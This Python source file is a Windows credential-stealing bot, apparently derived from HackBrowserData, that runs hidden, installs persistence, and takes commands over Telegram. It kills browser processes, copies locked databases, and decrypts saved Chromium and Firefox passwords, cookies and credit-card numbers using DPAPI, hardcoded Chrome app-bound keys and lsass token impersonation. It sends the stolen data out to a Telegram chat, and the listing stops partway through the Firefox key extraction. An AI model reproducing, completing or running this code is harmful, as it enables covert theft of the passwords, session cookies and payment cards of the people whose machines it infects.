#!/usr/bin/env python3
"""
HackBrowserData — Standalone Windows Bot
Platform: Windows 10 / 11 (native, no WSL)
Browsers: Chrome, Edge, Firefox, Brave, Opera, Vivaldi, Yandex + more

SETUP:
  1. Set BOT_TOKEN and CHAT_ID below.
  2. Run:  python bot_windows_native.py
     (auto-relaunches hidden via pythonw.exe)
  3. Auto-installs pip dependencies, persistence, reports to Telegram.

COMMANDS:
  /extract    — Collect all browser data and send as ZIP
  /info       — System information
  /browsers   — List detected browsers
  /wifi       — Saved Wi-Fi passwords
  /screenshot — Capture desktop screenshot
  /status     — Bot status + uptime
  /help       — This message
"""

# ========================= CONFIGURATION =========================
BOT_TOKEN  = ""
CHAT_ID    = ""
CHECK_INTERVAL = 3600   # auto-extraction interval (seconds); 0 = disabled
AUTO_PERSIST   = True
# =================================================================

import os, sys, json, base64, shutil, sqlite3, tempfile, zipfile
import platform, subprocess, time, threading, atexit, ctypes, ctypes.wintypes
from pathlib import Path
from datetime import datetime

if os.name != 'nt':
    print('This bot is Windows-only. Use bot_linux.py on Linux.')
    sys.exit(1)

# ── dependency bootstrap ──
def _pip(*pkgs):
    try:
        subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '-q'] + list(pkgs),
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
    except Exception:
        pass

try:
    import requests
except ImportError:
    _pip('requests'); import requests

try:
    from Crypto.Cipher import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA1, SHA256
except ImportError:
    _pip('pycryptodome')
    from Crypto.Cipher import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA1, SHA256

_START = time.time()

# ========================= DPAPI ==================================

class _BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', ctypes.wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_ubyte)),
    ]

def dpapi_decrypt(blob: bytes) -> bytes:
    """CryptUnprotectData via ctypes. No pywin32 needed."""
    p_in  = ctypes.create_string_buffer(blob, len(blob))
    b_in  = _BLOB(len(blob), ctypes.cast(p_in, ctypes.POINTER(ctypes.c_ubyte)))
    b_out = _BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(b_in), None, None, None, None, 0, ctypes.byref(b_out))
    if not ok:
        raise ctypes.WinError()
    result = bytes(bytearray(b_out.pbData[:b_out.cbData]))
    ctypes.windll.kernel32.LocalFree(b_out.pbData)
    return result

# ========================= WIN32 FILE COPY ========================

_GENERIC_READ      = 0x80000000
_FILE_SHARE_ALL    = 0x07
_OPEN_EXISTING     = 3
_INVALID_HANDLE    = ctypes.wintypes.HANDLE(-1).value

def _win32_copy(src: Path, dst: Path) -> bool:
    """Copy a file that may be locked by another process (shared-read)."""
    handle = ctypes.windll.kernel32.CreateFileW(
        str(src), _GENERIC_READ, _FILE_SHARE_ALL, None, _OPEN_EXISTING, 0, None)
    if handle == _INVALID_HANDLE:
        return False
    try:
        hi = ctypes.wintypes.DWORD()
        lo = ctypes.windll.kernel32.GetFileSize(handle, ctypes.byref(hi))
        size = lo + (hi.value << 32)
        if size <= 0 or size > 500_000_000:
            return False
        buf  = ctypes.create_string_buffer(size)
        read = ctypes.wintypes.DWORD()
        ok   = ctypes.windll.kernel32.ReadFile(
            handle, buf, size, ctypes.byref(read), None)
        if not ok:
            return False
        dst.write_bytes(buf.raw[:read.value])
        return True
    finally:
        ctypes.windll.kernel32.CloseHandle(handle)


def _esentutl_copy(src: Path, dst: Path) -> bool:
    """Copy locked file using esentutl.exe with Volume Shadow Copy."""
    try:
        r = subprocess.run(
            ['esentutl.exe', '/y', str(src), '/vss', '/d', str(dst)],
            capture_output=True, timeout=30,
            creationflags=0x08000000)
        return r.returncode == 0 and dst.exists()
    except Exception:
        return False


_BROWSER_PROCS = [
    'chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe', 'vivaldi.exe',
    'firefox.exe', 'waterfox.exe', 'librewolf.exe', 'thunderbird.exe',
    'yandex.exe', 'browser.exe', 'iridium.exe', 'chromium.exe',
]

def _kill_browsers():
    """Force-kill all known browser processes to release file locks and flush WAL."""
    killed = []
    for proc_name in _BROWSER_PROCS:
        try:
            r = subprocess.run(
                ['taskkill', '/F', '/IM', proc_name],
                capture_output=True, timeout=10,
                creationflags=0x08000000)
            if r.returncode == 0:
                killed.append(proc_name)
        except Exception:
            pass
    if killed:
        time.sleep(2)
    return killed

# ========================= TELEGRAM API ===========================

_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
_FILE_LIMIT = 49 * 1024 * 1024


def _tg(method, **kw):
    url = f'{_API}/{method}'
    for attempt in range(5):
        try:
            r = requests.post(url, timeout=60, **kw)
            data = r.json()
            if not data.get('ok'):
                code = data.get('error_code', 0)
                desc = data.get('description', '?')
                if code == 429:
                    retry = data.get('parameters', {}).get('retry_after', 5)
                    print(f'[TG] Rate limited, sleeping {retry}s')
                    time.sleep(retry + 1)
                    continue
                print(f'[TG] {method} failed ({code}): {desc}')
            return data
        except Exception as e:
            print(f'[TG] {method} attempt {attempt+1}: {e}')
            time.sleep(min(2 ** attempt, 30))
    return None


def delete_webhook():
    r = _tg('deleteWebhook', data={'drop_pending_updates': False})
    if r and r.get('ok'):
        print('[TG] Webhook cleared')
    else:
        print('[TG] deleteWebhook failed')


def send_message(text, chat_id=None):
    cid = chat_id or CHAT_ID
    for i in range(0, max(1, len(text)), 4096):
        _tg('sendMessage',
            data={'chat_id': cid, 'text': text[i:i+4096], 'parse_mode': 'HTML'})


def send_file(path, chat_id=None, caption=None):
    cid = chat_id or CHAT_ID
    try:
        size = os.path.getsize(path)
        if size <= _FILE_LIMIT:
            with open(path, 'rb') as fh:
                return _tg('sendDocument',
                    data={'chat_id': cid, 'caption': caption or ''},
                    files={'document': (os.path.basename(path), fh)})
        part_num = 0
        with open(path, 'rb') as fh:
            while True:
                chunk = fh.read(_FILE_LIMIT)
                if not chunk:
                    break
                part_num += 1
                pname = f'{os.path.basename(path)}.part{part_num:02d}'
                ppath = Path(tempfile.gettempdir()) / pname
                try:
                    ppath.write_bytes(chunk)
                    with open(ppath, 'rb') as pf:
                        _tg('sendDocument',
                            data={'chat_id': cid,
                                  'caption': f'{caption or "File"} (part {part_num})'},
                            files={'document': (pname, pf)})
                finally:
                    ppath.unlink(missing_ok=True)
        send_message(
            f'Split into {part_num} parts. Reassemble: '
            f'<code>copy /b *.part* combined.zip</code>', cid)
    except Exception as e:
        send_message(f'Upload error: {e}', cid)


def get_updates(offset=None):
    params = {'timeout': 30}
    if offset is not None:
        params['offset'] = offset
    for attempt in range(3):
        try:
            r = requests.get(f'{_API}/getUpdates', params=params, timeout=35)
            data = r.json()
            if not data.get('ok'):
                print(f'[TG] getUpdates: {data.get("description","?")}')
                return None
            return data
        except Exception as e:
            print(f'[TG] getUpdates attempt {attempt+1}: {e}')
            time.sleep(2 ** attempt)
    return None


def _is_authorized(cid):
    return str(cid) == str(CHAT_ID)

# ========================= SYSTEM INFO ============================


def system_info():
    return {
        'platform':  f'Windows {platform.release()}',
        'version':   platform.version(),
        'arch':      platform.machine(),
        'hostname':  platform.node() or os.environ.get('COMPUTERNAME', '?'),
        'username':  os.environ.get('USERNAME', '?'),
        'home':      str(Path.home()),
        'python':    sys.version.split()[0],
        'elevated':  str(ctypes.windll.shell32.IsUserAnAdmin() != 0),
    }

# ========================= BROWSER PATHS ==========================

_LAD = Path(os.environ.get('LOCALAPPDATA', ''))
_RAD = Path(os.environ.get('APPDATA', ''))


def find_browser_paths():
    chromium_bases = {
        'chrome':       _LAD / 'Google/Chrome/User Data',
        'chrome-beta':  _LAD / 'Google/Chrome Beta/User Data',
        'chrome-dev':   _LAD / 'Google/Chrome Dev/User Data',
        'chromium':     _LAD / 'Chromium/User Data',
        'edge':         _LAD / 'Microsoft/Edge/User Data',
        'edge-beta':    _LAD / 'Microsoft/Edge Beta/User Data',
        'brave':        _LAD / 'BraveSoftware/Brave-Browser/User Data',
        'opera':        _RAD / 'Opera Software/Opera Stable',
        'opera-gx':     _RAD / 'Opera Software/Opera GX Stable',
        'vivaldi':      _LAD / 'Vivaldi/User Data',
        'yandex':       _LAD / 'Yandex/YandexBrowser/User Data',
        'coc-coc':      _LAD / 'CocCoc/Browser/User Data',
        'cent':         _LAD / 'CentBrowser/User Data',
        'torch':        _LAD / 'Torch/User Data',
        'slimjet':      _LAD / 'Slimjet/User Data',
    }
    firefox_bases = {
        'firefox':      _RAD / 'Mozilla/Firefox',
        'librewolf':    _LAD / 'librewolf',
        'waterfox':     _RAD / 'Waterfox',
        'thunderbird':  _RAD / 'Thunderbird',
    }
    result = {}
    for name, base in chromium_bases.items():
        if not base.exists():
            continue
        profiles = []
        try:
            for item in base.iterdir():
                if item.is_dir() and (
                    item.name == 'Default' or item.name.startswith('Profile ')):
                    profiles.append(item)
        except PermissionError:
            continue
        if profiles:
            result[name] = profiles
    for name, base in firefox_bases.items():
        if base.exists():
            result[name] = base
    return result


def find_firefox_profiles(base_path):
    ini = base_path / 'profiles.ini'
    profiles = []
    if ini.exists():
        try:
            import configparser
            cfg = configparser.ConfigParser()
            cfg.read(ini)
            for sec in cfg.sections():
                if not sec.lower().startswith('profile'):
                    continue
                pv = cfg.get(sec, 'Path', fallback=None)
                if pv is None:
                    continue
                rel = cfg.getint(sec, 'IsRelative', fallback=1)
                p = (base_path / pv) if rel else Path(pv)
                if p.exists():
                    profiles.append(p)
        except Exception:
            pass
    if not profiles:
        try:
            for item in base_path.iterdir():
                if item.is_dir() and '.default' in item.name:
                    profiles.append(item)
        except Exception:
            pass
    return profiles

# =================== CHROMIUM DECRYPTION ==========================


def chromium_master_key(browser_base):
    """DPAPI-decrypt the master key from Local State."""
    ls = browser_base / 'Local State'
    if not ls.exists():
        return None
    try:
        data = json.loads(ls.read_text(encoding='utf-8'))
        enc_b64 = data['os_crypt']['encrypted_key']
        enc = base64.b64decode(enc_b64)
        if enc[:5] == b'DPAPI':
            enc = enc[5:]
        return dpapi_decrypt(enc)
    except Exception as e:
        print(f'[key] DPAPI master key error: {e}')
        return None


_v20_key_cache = {}

# Chrome v20 hardcoded keys (from elevation_service.exe)
_V20_AES_KEY = base64.b64decode('sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=')  # Flag 1: AES-256-GCM (Chrome 130-132)
_V20_CHACHA20_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")  # Flag 2: ChaCha20-Poly1305 (Chrome 133-136)
_V20_XOR_KEY = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")  # Flag 3: XOR key (Chrome 137+)


def byte_xor(ba1, ba2):
    """XOR two byte arrays element-wise."""
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def parse_key_blob(blob_data: bytes) -> dict:
    """Parse Chrome v20 key blob structure with header, flag, IV, ciphertext, and tag."""
    import struct
    import io
    
    if len(blob_data) < 12:
        return None
    
    try:
        buffer = io.BytesIO(blob_data)
        parsed_data = {}
        
        # Read header length and header
        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        
        # Read content length
        content_len = struct.unpack('<I', buffer.read(4))[0]
        expected_len = header_len + content_len + 8
        
        if expected_len != len(blob_data):
            return None
        
        # Read flag byte
        parsed_data['flag'] = buffer.read(1)[0]
        
        # Parse based on flag
        if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
            # [flag|iv|ciphertext|tag]
            # [1byte|12bytes|32bytes|16bytes]
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        elif parsed_data['flag'] == 3:
            # [flag|encrypted_aes_key|iv|ciphertext|tag]
            # [1byte|32bytes|12bytes|32bytes|16bytes]
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        else:
            return None
        
        return parsed_data
    except Exception:
        return None


def decrypt_with_cng(input_data: bytes) -> bytes:
    """Decrypt using Windows CNG NCrypt API with Google Chromekey1."""
    try:
        ncrypt = ctypes.windll.NCRYPT
        
        class NCRYPT_PROV_HANDLE(ctypes.c_void_p):
            pass
        
        class NCRYPT_KEY_HANDLE(ctypes.c_void_p):
            pass
        
        hProvider = NCRYPT_PROV_HANDLE()
        provider_name = "Microsoft Software Key Storage Provider"
        status = ncrypt.NCryptOpenStorageProvider(
            ctypes.byref(hProvider), provider_name, 0
        )
        if status != 0:
            return None
        
        hKey = NCRYPT_KEY_HANDLE()
        key_name = "Google Chromekey1"
        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
        if status != 0:
            ncrypt.NCryptFreeObject(hProvider)
            return None
        
        pcbResult = ctypes.c_ulong(0)
        input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
        
        status = ncrypt.NCryptDecrypt(
            hKey, input_buffer, len(input_buffer),
            None, None, 0, ctypes.byref(pcbResult), 0x40
        )
        if status != 0:
            ncrypt.NCryptFreeObject(hKey)
            ncrypt.NCryptFreeObject(hProvider)
            return None
        
        buffer_size = pcbResult.value
        output_buffer = (ctypes.c_ubyte * buffer_size)()
        
        status = ncrypt.NCryptDecrypt(
            hKey, input_buffer, len(input_buffer),
            None, output_buffer, buffer_size,
            ctypes.byref(pcbResult), 0x40
        )
        
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        
        if status != 0:
            return None
        
        return bytes(output_buffer[:pcbResult.value])
    except Exception:
        return None


def impersonate_lsass():
    """Attempt to impersonate SYSTEM via lsass.exe for CNG decryption (flag 3)."""
    try:
        import windows
        import windows.crypto
        import windows.generated_def as gdef
        
        class ImpersonationContext:
            def __init__(self):
                self.original_token = None
                self.impersonation_token = None
            
            def __enter__(self):
                try:
                    self.original_token = windows.current_thread.token
                    windows.current_process.token.enable_privilege("SeDebugPrivilege")
                    proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
                    lsass_token = proc.token
                    self.impersonation_token = lsass_token.duplicate(
                        type=gdef.TokenImpersonation,
                        impersonation_level=gdef.SecurityImpersonation
                    )
                    windows.current_thread.token = self.impersonation_token
                    return self
                except Exception:
                    return None
            
            def __exit__(self, exc_type, exc_val, exc_tb):
                if self.original_token:
                    try:
                        windows.current_thread.token = self.original_token
                    except Exception:
                        pass
        
        return ImpersonationContext()
    except ImportError:
        return None
    except Exception:
        return None


def _derive_v20_key(browser_base):
    """Extract and cache the v20 app-bound decryption key for a browser (supports flags 1, 2, 3)."""
    cache_key = str(browser_base)
    if cache_key in _v20_key_cache:
        return _v20_key_cache[cache_key]

    ls = browser_base / 'Local State'
    if not ls.exists():
        return None
    try:
        data = json.loads(ls.read_text(encoding='utf-8'))
        abk_b64 = data.get('os_crypt', {}).get('app_bound_encrypted_key', '')
        if not abk_b64:
            return None
        abk = base64.b64decode(abk_b64)
        if abk[:4] != b'APPB':
            return None
        dpapi_blob = abk[4:]

        # Stage 1: User-level DPAPI decrypt (may need SYSTEM for Chrome 127+)
        try:
            dec1 = dpapi_decrypt(dpapi_blob)
        except Exception:
            # Try elevation service via PowerShell COM as fallback
            try:
                browser_name = browser_base.parts[-2].lower() if len(browser_base.parts) >= 2 else ''
                clsid = '708860E0-F641-4611-8895-7D867DD3675B'
                if 'edge' in browser_name or 'msedge' in browser_name:
                    clsid = 'C6E2C5F8-3E5F-4B2C-8D4A-4B6E2C5F83E5'
                ps = (
                    f'$t=[Type]::GetTypeFromCLSID([guid]"{clsid}");'
                    '$o=[Activator]::CreateInstance($t);'
                    f'$enc="{abk_b64}";'
                    '$dec=$null;$err=0;'
                    '[void]$o.GetType().InvokeMember("DecryptData",'
                    '"InvokeMethod",$null,$o,@($enc,[ref]$dec,[ref]$err));'
                    '[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($dec))'
                )
                r = subprocess.run(
                    ['powershell', '-NoProfile', '-Command', ps],
                    capture_output=True, text=True, timeout=15,
                    creationflags=0x08000000)
                if r.returncode == 0 and r.stdout.strip():
                    raw = base64.b64decode(r.stdout.strip())
                    if len(raw) >= 32:
                        key = raw[-32:]
                        _v20_key_cache[cache_key] = key
                        return key
            except Exception:
                pass
            _v20_key_cache[cache_key] = None
            return None

        # Stage 2: Second DPAPI decrypt
        try:
            dec2 = dpapi_decrypt(dec1)
        except Exception:
            dec2 = None

        if not dec2:
            _v20_key_cache[cache_key] = None
            return None

        # Stage 3: Parse key blob with flag detection
        parsed_data = parse_key_blob(dec2)
        if not parsed_data:
            # Fallback to legacy logic
            if len(dec2) >= 61:
                final = dec2[-61:]
                flag = final[0]
                if flag == 1:
                    iv = final[1:13]
                    ct = final[13:45]
                    tag = final[45:]
                    try:
                        cipher = AES.new(_V20_AES_KEY, AES.MODE_GCM, nonce=iv)
                        key = cipher.decrypt_and_verify(ct, tag)
                        _v20_key_cache[cache_key] = key
                        return key
                    except Exception:
                        pass
            if len(dec1) >= 32:
                key = dec1[-32:]
                _v20_key_cache[cache_key] = key
                return key
            _v20_key_cache[cache_key] = None
            return None

        # Stage 4: Decrypt based on flag
        flag = parsed_data['flag']
        iv = parsed_data['iv']
        ciphertext = parsed_data['ciphertext']
        tag = parsed_data['tag']

        if flag == 1:
            # AES-256-GCM with hardcoded key (Chrome 130-132)
            try:
                cipher = AES.new(_V20_AES_KEY, AES.MODE_GCM, nonce=iv)
                key = cipher.decrypt_and_verify(ciphertext, tag)
                _v20_key_cache[cache_key] = key
                return key
            except Exception:
                pass

        elif flag == 2:
            # ChaCha20-Poly1305 with hardcoded key (Chrome 133-136)
            try:
                from Crypto.Cipher import ChaCha20_Poly1305
                cipher = ChaCha20_Poly1305.new(key=_V20_CHACHA20_KEY, nonce=iv)
                key = cipher.decrypt_and_verify(ciphertext, tag)
                _v20_key_cache[cache_key] = key
                return key
            except Exception:
                pass

        elif flag == 3:
            # AES-256-GCM with CNG-decrypted and XORed key (Chrome 137+)
            encrypted_aes_key = parsed_data.get('encrypted_aes_key')
            if not encrypted_aes_key:
                _v20_key_cache[cache_key] = None
                return None
            
            impersonation_ctx = impersonate_lsass()
            if impersonation_ctx:
                with impersonation_ctx:
                    decrypted_aes_key = decrypt_with_cng(encrypted_aes_key)
            else:
                decrypted_aes_key = decrypt_with_cng(encrypted_aes_key)
            
            if not decrypted_aes_key:
                _v20_key_cache[cache_key] = None
                return None
            
            try:
                xored_aes_key = byte_xor(decrypted_aes_key, _V20_XOR_KEY)
                cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
                key = cipher.decrypt_and_verify(ciphertext, tag)
                _v20_key_cache[cache_key] = key
                return key
            except Exception:
                pass

    except Exception:
        pass
    
    _v20_key_cache[cache_key] = None
    return None


def chromium_decrypt_v20(blob, browser_base):
    """Decrypt a v20 App-Bound encrypted value using the cached key."""
    key = _derive_v20_key(browser_base)
    if key is None:
        return ''
    try:
        nonce      = blob[3:15]
        ct_and_tag = blob[15:]
        ciphertext = ct_and_tag[:-16]
        tag        = ct_and_tag[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        try:
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
        except ValueError:
            return cipher.decrypt(ciphertext).decode('utf-8', errors='replace').rstrip('\x00')
    except Exception:
        return ''


def chromium_decrypt(blob, key, browser_base=None):
    """
    v20 → App-Bound (try DPAPI heuristic)
    v10/v11 → AES-256-GCM with DPAPI key
    raw → legacy DPAPI
    """
    try:
        if not blob:
            return ''
        if blob[:3] == b'v20':
            if browser_base:
                result = chromium_decrypt_v20(blob, browser_base)
                if result:
                    return result
            return ''
        if blob[:3] in (b'v10', b'v11'):
            if key is None:
                return ''
            nonce      = blob[3:15]
            ct_and_tag = blob[15:]
            ciphertext = ct_and_tag[:-16]
            tag        = ct_and_tag[-16:]
            cipher     = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                return cipher.decrypt_and_verify(ciphertext, tag).decode(
                    'utf-8', errors='replace')
            except ValueError:
                return cipher.decrypt(ciphertext).decode(
                    'utf-8', errors='replace').rstrip('\x00')
        return dpapi_decrypt(blob).decode('utf-8', errors='replace')
    except Exception:
        return '[decryption failed]'


def _chrome_ts(ts):
    if not ts or ts <= 0:
        return None
    try:
        return datetime.fromtimestamp((ts - 11_644_473_600_000_000) / 1_000_000)
    except (OSError, ValueError, OverflowError):
        return None

# ===================== TEMP-DB HELPER =============================


def _with_db(src, callback):
    """Copy DB to temp (multiple fallbacks for locked files), WAL checkpoint, run callback."""
    tmp = Path(tempfile.gettempdir()) / f'hbd_{os.getpid()}_{id(callback)}_{src.name}'
    try:
        copied = False
        try:
            shutil.copy2(src, tmp)
            copied = True
        except (PermissionError, OSError):
            pass
        if not copied:
            copied = _win32_copy(src, tmp)
        if not copied:
            copied = _esentutl_copy(src, tmp)
        if not copied:
            print(f'[db] All copy methods failed for {src.name}')
            return []
        for suffix in ('-wal', '-shm'):
            sidecar = src.parent / (src.name + suffix)
            if sidecar.exists():
                dst_sc = tmp.parent / (tmp.name + suffix)
                try:
                    shutil.copy2(sidecar, dst_sc)
                except (PermissionError, OSError):
                    if not _win32_copy(sidecar, dst_sc):
                        _esentutl_copy(sidecar, dst_sc)
        conn = sqlite3.connect(str(tmp))
        try:
            conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
        except Exception:
            pass
        try:
            return callback(conn.cursor())
        finally:
            conn.close()
    except Exception as e:
        print(f'[db] Error reading {src.name}: {e}')
        return []
    finally:
        for suffix in ('', '-wal', '-shm'):
            try:
                (tmp.parent / (tmp.name + suffix)).unlink(missing_ok=True)
            except Exception:
                pass

# =================== CHROMIUM EXTRACTORS ==========================


def get_chromium_passwords(profile, key, browser_base):
    db = profile / 'Login Data'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT origin_url,username_value,password_value,'
                'date_created,date_last_used FROM logins '
                'ORDER BY date_last_used DESC')
            for url, user, enc, dc, dlu in cur.fetchall():
                if user and enc:
                    rows.append({
                        'url':       url,
                        'username':  user,
                        'password':  chromium_decrypt(enc, key, browser_base),
                        'created':   str(_chrome_ts(dc) or ''),
                        'last_used': str(_chrome_ts(dlu) or ''),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_cookies(profile, key, browser_base):
    db = None
    for p in [profile / 'Network' / 'Cookies', profile / 'Cookies']:
        if p.exists():
            db = p; break
    if db is None:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host_key,name,encrypted_value,path,expires_utc,'
                'is_secure,is_httponly FROM cookies ORDER BY host_key')
            for host, name, enc, path, exp, sec, httpo in cur.fetchall():
                if enc:
                    rows.append({
                        'host': host, 'name': name,
                        'value': chromium_decrypt(enc, key, browser_base),
                        'path': path,
                        'expires': str(_chrome_ts(exp) or ''),
                        'secure': bool(sec), 'httponly': bool(httpo),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_history(profile):
    db = profile / 'History'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_time '
                'FROM urls ORDER BY last_visit_time DESC LIMIT 2000')
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url': url, 'title': title or '',
                    'visits': vc, 'last_visit': str(_chrome_ts(lv) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_bookmarks(profile):
    bm = profile / 'Bookmarks'
    if not bm.exists():
        return []
    bookmarks = []
    def _walk(node, folder=''):
        if node.get('type') == 'url':
            bookmarks.append({
                'name': node.get('name', ''), 'url': node.get('url', ''),
                'folder': folder})
        elif node.get('type') == 'folder':
            sub = f"{folder}/{node.get('name','')}" if folder else node.get('name','')
            for child in node.get('children', []):
                _walk(child, sub)
    try:
        data = json.loads(bm.read_text(encoding='utf-8'))
        for root in data.get('roots', {}).values():
            if isinstance(root, dict):
                for child in root.get('children', []):
                    _walk(child)
    except Exception:
        pass
    return bookmarks


def get_chromium_credit_cards(profile, key, browser_base):
    db = profile / 'Web Data'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT name_on_card,expiration_month,expiration_year,'
                'card_number_encrypted FROM credit_cards')
            for name, em, ey, enc in cur.fetchall():
                if enc:
                    rows.append({
                        'name': name,
                        'number': chromium_decrypt(enc, key, browser_base),
                        'expiry': f'{em}/{ey}',
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_downloads(profile):
    db = profile / 'History'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT target_path,tab_url,total_bytes,start_time '
                'FROM downloads ORDER BY start_time DESC LIMIT 500')
            for target, url, size, st in cur.fetchall():
                rows.append({
                    'path': target, 'url': url,
                    'size': size, 'date': str(_chrome_ts(st) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_autofill(profile):
    db = profile / 'Web Data'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT name,value,count,date_last_used '
                'FROM autofill ORDER BY count DESC LIMIT 500')
            for name, val, cnt, dlu in cur.fetchall():
                rows.append({
                    'field': name, 'value': val,
                    'count': cnt, 'last_used': str(_chrome_ts(dlu) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ====================== FIREFOX DECRYPTION ========================

_OID_3DES       = '1.2.840.113549.3.7'
_OID_AES256_CBC = '2.16.840.1.101.3.4.1.42'
_OID_HMAC_SHA1  = '1.2.840.113549.2.7'


def _der_next(data, pos):
    tag = data[pos]; pos += 1
    b   = data[pos]; pos += 1
    if b < 0x80:
        length = b
    else:
        n = b & 0x7f
        length = int.from_bytes(data[pos:pos+n], 'big')
        pos += n
    return tag, data[pos:pos+length], pos + length


def _oid_str(raw):
    parts = [raw[0]//40, raw[0]%40]
    acc = 0
    for b in raw[1:]:
        acc = (acc << 7) | (b & 0x7f)
        if not (b & 0x80):
            parts.append(acc); acc = 0
    return '.'.join(map(str, parts))


def _ff_pbes2_decrypt(blob, password=b''):
    try:
        _, outer, _ = _der_next(blob, 0)
        pos = 0
        _, alg_id, pos = _der_next(outer, pos)
        _, ct, _       = _der_next(outer, pos)
        pos = 0
        _, _, pos      = _der_next(alg_id, pos)
        _, params, _   = _der_next(alg_id, pos)
        pos = 0
        _, kdf_seq, pos = _der_next(params, pos)
        _, enc_seq, _   = _der_next(params, pos)
        pos = 0
        _, _, pos       = _der_next(kdf_seq, pos)
        _, kdf_p, _     = _der_next(kdf_seq, pos)
        pos = 0
        _, salt, pos     = _der_next(kdf_p, pos)
        _, iter_raw, pos = _der_next(kdf_p, pos)
        iterations = int.from_bytes(iter_raw, 'big')
        key_len, hmac_mod = 32, SHA256
        if pos < len(kdf_p):
            t2, v2, p2 = _der_next(kdf_p, pos)
            if t2 == 0x02:
                key_len = int.from_bytes(v2, 'big')
                if p2 < len(kdf_p):
                    _, ps, _ = _der_next(kdf_p, p2)
                    _, po, _ = _der_next(ps, 0)
                    if _oid_str(po) == _OID_HMAC_SHA1:
                        hmac_mod = SHA1
            elif t2 == 0x30:
                _, po, _ = _der_next(v2, 0)
                if _oid_str(po) == _OID_HMAC_SHA1:
                    hmac_mod = SHA1; key_len = 24
        pos = 0
        _, eo, pos = _der_next(enc_seq, pos)
        _, iv, _   = _der_next(enc_seq, pos)
        co = _oid_str(eo)
        key = PBKDF2(password, salt, dkLen=key_len, count=iterations,
                     hmac_hash_module=hmac_mod)
        if co == _OID_3DES:
            return DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ct)
        return AES.new(key[:key_len], AES.MODE_CBC, iv).decrypt(ct)
    except Exception:
        return None


def _ff_extract_cka(dec):
    if len(dec) >= 102: return dec[70:102], _OID_AES256_CBC
    if len(dec) >= 94:  return dec[70:94],  _OID_3DES
    if len(dec) >= 32:  return dec[-32:],   _OID_AES256_CBC
    return None, None


def get_firefox_master_key(profile_path):
    key4 = profile_path / 'key4.db'
    if not key4.exists():
        return None, None
    def _q(cur):
        try:
            cur.execute("SELECT item2 FROM metadata WHERE id='password'")
            row = cur.fetchone()
            if not row:
                return None, None
            check = _ff_pbes2_decrypt(bytes(row[0]))
            if check is None or b'password-check' not in check[:20]:
                return None, None
            cur.execute("SELECT name FROM sqlite_master "
                        "WHERE type='table' AND name='nssPrivate'")
            if not cur.fetchone():
                return None, None
            cur.execute('SELECT a11 FROM nssPrivate')
            for (a11,) in cur.fetchall():
                if not a11:
                    continue
                dec = _ff_pbes2_decrypt(bytes(a11))
                if dec is None:
                    continue
                key, oid = _ff_extract_cka(dec)
                if key:
                    return key, oid
        except Exception:
            pass
        return None, None
    tmp = Path(tempfile.gettempdir()) / f'key4_{os.getpid()}.db'
    try:
        copied = False
        try:
            shutil.copy2(key4, tmp)
            copied = True
        except (PermissionError, OSError):
            pass
        if not copied:
            copied = _win32_copy(key4, tmp)
        if not copied:
            copied = _esentutl_copy(key4, tmp)
        if not copied:
            return None, None
        for suffix in ('-wal', '-shm'):
            sc = key4.parent / (key4.name + suffix)
            if sc.exists():
                dst_sc = tmp.parent / (tmp.name + suffix)
                try:
                    shutil.copy2(sc, dst_sc)
                except (PermissionError, OSError):
                    if not _win32_copy(sc, dst_sc):
                        _esentutl_copy(sc, dst_sc)
        conn = sqlite3.connect(str(tmp))
        try:
